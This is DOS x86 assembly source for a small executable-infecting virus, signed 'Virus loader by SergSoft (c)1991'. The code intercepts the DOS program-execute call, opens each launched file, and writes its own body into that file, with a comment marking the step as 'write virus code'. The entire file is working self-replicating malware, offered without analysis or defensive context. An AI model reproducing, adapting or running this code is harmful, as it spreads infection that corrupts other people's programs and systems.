.286
.model tiny
.radix 16
.code
a       equ     0B8
        org     100
e:      dec     bp
        push	si
        push    cs
        push	cs
        scasw
        mov     al,27
        mov     bl,14
        mov     es,ax
        pusha
        cmpsw
        popa
        mov     cl,l-e
        rep     movsb           ;es:di = 2E:l-e  ds:si = CS:l-e+100
        mov	ds,cx
        jz	f
        push	ax
        xchg	[bx+di],ax
        stosw
        pop	ax
        xchg	[bx+di],ax
        stosw
f:	pop	ds
	lodsw
	xchg	ax,cx
	pop	es
	pop	di
	rep	movsb
	jmp	e
h:      pusha
        ;cld
        push    ds
        push    es
        xor     ah,4bh
        jnz     j               ;if not 'exec'
        mov     ax,3D02         ;open file
        int     a
        jc      j               ;if not found
        xchg    bx,ax           ;bx = handler
        mov     ch,0A0
        mov     ds,cx           ;8C??:2  buffer
        push    ds
        pop     es
        mov     ch,0FA          ;all bytes
        xor     di,di
        mov     dx,2
        mov     ah,3F
        int     a               ;read all bytes
        stosw
        cmp     byte ptr [di],4dh
        jz      i
        add     ax,dx
        push    ax
        mov     ax,4200
        cwd
        mov     cx,dx
        int     a
        mov     ah,40
        push    cs
        pop     ds              ;ds = 31
        mov     cl,l-e
        int     a               ;write virus code
        mov     ah,40
        push    es
        pop     ds
        pop     cx
        int     a
i:      mov     ah,3E
        int     a
j:      pop     es
        pop     ds
        popa
r:      db      0EA
l:      dw      30      
d:      mov     dx,c-d+100
        mov     ah,09
        int     21h
        ret
c:      db      ' Virus loader by SergSoft (c)1991',0D,0A,24
end     e
